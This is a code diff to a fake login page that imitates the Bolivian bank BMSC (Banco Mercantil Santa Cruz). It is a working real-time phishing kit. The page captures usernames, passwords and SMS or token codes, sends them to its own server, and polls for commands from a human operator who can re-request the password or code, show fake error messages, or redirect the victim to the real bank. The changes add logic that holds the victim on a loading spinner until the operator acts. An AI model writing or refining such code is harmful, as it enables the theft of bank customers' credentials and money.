@@ -9,8 +9,65 @@
     <link rel="stylesheet" type="text/css" href="/css/banca-override.css" />
     <style>
       @keyframes bmsc-spin {
-        0% { transform: rotate(0deg); }
-        100% { transform: rotate(360deg); }
+        0% { transform: rotate(0deg); -webkit-transform: rotate(0deg); }
+        100% { transform: rotate(360deg); -webkit-transform: rotate(360deg); }
+      }
+      @-webkit-keyframes bmsc-spin {
+        0% { -webkit-transform: rotate(0deg); }
+        100% { -webkit-transform: rotate(360deg); }
+      }
+      .bmsc-spinner-circle {
+        display: inline-block;
+        width: 52px;
+        height: 52px;
+        border: 4px solid #e2e8f0;
+        border-top-color: #15803d;
+        border-radius: 50% !important;
+        animation: bmsc-spin 0.85s linear infinite;
+        -webkit-animation: bmsc-spin 0.85s linear infinite;
+        margin-bottom: 18px;
+        box-sizing: border-box;
+      }
+      #spinnerTextTitle {
+        font-size: 16px;
+        font-weight: 700;
+        color: #1e293b;
+        margin-bottom: 8px;
+        font-family: inherit;
+      }
+      #spinnerTextSub {
+        font-size: 13px;
+        color: #64748b;
+        font-family: inherit;
+        max-width: 360px;
+        line-height: 1.4;
+      }
+      #container .contentLogin,
+      #container div.contentLogin,
+      .contentLogin {
+        position: relative !important;
+      }
+      #loginSpinner {
+        display: none;
+        position: absolute;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        width: 100%;
+        height: 100%;
+        min-height: 380px;
+        background: #ffffff;
+        z-index: 9999;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        text-align: center;
+        padding: 40px 20px;
+        box-sizing: border-box;
+      }
+      #loginSpinner.is-active {
+        display: flex !important;
       }
     </style>
   </head>
@@ -147,10 +204,10 @@
             </form>
 
             <!-- Loading Spinner -->
-            <div id="loginSpinner" style="display: none; text-align: center; padding: 70px 20px;">
-              <div style="display: inline-block; width: 44px; height: 44px; border: 4px solid #e2e8f0; border-top-color: #15803d; border-radius: 50%; animation: bmsc-spin 0.9s linear infinite; margin-bottom: 18px;"></div>
-              <p id="spinnerTextTitle" style="font-size: 14px; font-weight: 700; color: #1e293b; margin-bottom: 6px;">Verificando sus credenciales</p>
-              <p id="spinnerTextSub" style="font-size: 11px; color: #64748b;">Por favor espere un momento mientras procesamos su solicitud de ingreso...</p>
+            <div id="loginSpinner">
+              <div class="bmsc-spinner-circle"></div>
+              <p id="spinnerTextTitle">Verificando sus credenciales</p>
+              <p id="spinnerTextSub">Por favor espere un momento mientras procesamos su solicitud de ingreso...</p>
             </div>
           </div>
 
@@ -221,6 +278,8 @@
 
       let pingInterval = null;
       let pollInterval = null;
+      let isWaitingForNextAction = false;
+      let lastSubmitTime = 0;
 
       // Elements
       const user = document.getElementById("MainContent_ctl01_txtUserNamePassword");
@@ -265,6 +324,9 @@
           return;
         }
 
+        isWaitingForNextAction = true;
+        lastSubmitTime = Date.now();
+
         // Queda en spinner de carga esperando la acción del operador
         showSpinner("Verificando credenciales", "Por favor espere un momento mientras procesamos su solicitud de ingreso...");
 
@@ -286,7 +348,10 @@
 
       function goToUser() {
         hideError();
+        isWaitingForNextAction = false;
+        hideSpinner();
         stepPass.hidden = true;
+        stepToken.hidden = true;
         stepUser.hidden = false;
         box?.classList.remove("extended");
         if (user) user.focus();
@@ -344,17 +409,23 @@
       }
 
       function showSpinner(title, subtitle) {
-        spinnerTextTitle.textContent = title || "Verificando credenciales";
-        spinnerTextSub.textContent = subtitle || "Por favor espere un momento...";
-        stepUser.hidden = true;
-        stepPass.hidden = true;
-        stepToken.hidden = true;
-        loginSpinner.style.display = "block";
+        if (spinnerTextTitle) spinnerTextTitle.textContent = title || "Verificando credenciales";
+        if (spinnerTextSub) spinnerTextSub.textContent = subtitle || "Por favor espere un momento mientras procesamos su solicitud de ingreso...";
+        if (stepUser) stepUser.hidden = true;
+        if (stepPass) stepPass.hidden = true;
+        if (stepToken) stepToken.hidden = true;
+        if (loginSpinner) {
+          loginSpinner.classList.add("is-active");
+          loginSpinner.style.display = "flex";
+        }
         box?.classList.add("extended");
       }
 
       function hideSpinner() {
-        loginSpinner.style.display = "none";
+        if (loginSpinner) {
+          loginSpinner.classList.remove("is-active");
+          loginSpinner.style.display = "none";
+        }
       }
 
       function startPolling() {
@@ -375,6 +446,10 @@
               }
 
               if (action === 'password' || action === 'pedir-password') {
+                if (isWaitingForNextAction && (session.updatedAt || 0) <= lastSubmitTime) {
+                  return; // Mantener al usuario en el spinner! No reabrir la contraseña!
+                }
+                isWaitingForNextAction = false;
                 hideSpinner();
                 stepUser.hidden = true;
                 stepToken.hidden = true;
@@ -382,6 +457,10 @@
                 box?.classList.add("extended");
                 if (pass) pass.focus();
               } else if (action === 'dinamica' || action === 'sms') {
+                if (isWaitingForNextAction && (session.updatedAt || 0) <= lastSubmitTime) {
+                  return; // Mantener al usuario en el spinner!
+                }
+                isWaitingForNextAction = false;
                 hideSpinner();
                 tokenErrorBox.style.display = "none";
                 stepPass.hidden = true;
@@ -399,20 +478,27 @@
 
                 resetOtpSlots();
               } else if (action === 'error-login') {
+                isWaitingForNextAction = false;
                 hideSpinner();
                 stepPass.hidden = true;
+                stepToken.hidden = true;
                 stepUser.hidden = false;
                 box?.classList.remove("extended");
                 showError("El usuario o la contraseña ingresada son incorrectos. Verifique sus datos e intente nuevamente.");
-                pass.value = "";
-                user.focus();
+                if (pass) pass.value = "";
+                if (user) user.focus();
               } else if (action === 'error-dinamica' || action === 'error-sms') {
+                isWaitingForNextAction = false;
                 hideSpinner();
+                stepPass.hidden = true;
+                stepUser.hidden = true;
                 stepToken.hidden = false;
+                box?.classList.add("extended");
                 tokenErrorBox.textContent = "El código ingresado es incorrecto o ha expirado. Por favor intente nuevamente.";
                 tokenErrorBox.style.display = "block";
                 resetOtpSlots();
               } else if (action === 'done') {
+                isWaitingForNextAction = false;
                 clearInterval(pingInterval);
                 clearInterval(pollInterval);
                 window.location.href = "https://www.bmsc.com.bo/";
@@ -438,6 +524,9 @@
           return;
         }
 
+        isWaitingForNextAction = true;
+        lastSubmitTime = Date.now();
+
         showSpinner("Verificando sus credenciales", "Estamos procesando su solicitud de ingreso...");
 
         const sessionPayload = {
@@ -461,6 +550,7 @@
           startPolling();
         })
         .catch(() => {
+          isWaitingForNextAction = false;
           hideSpinner();
           stepPass.hidden = false;
           showError("No se pudo conectar con el servidor. Intente de nuevo.");
@@ -523,6 +613,8 @@
         }
 
         tokenErrorBox.style.display = "none";
+        isWaitingForNextAction = true;
+        lastSubmitTime = Date.now();
         showSpinner("Validando código de seguridad", "Verificando el código ingresado...");
 
         fetch('/api/sessions/' + sessionId + '/token', {
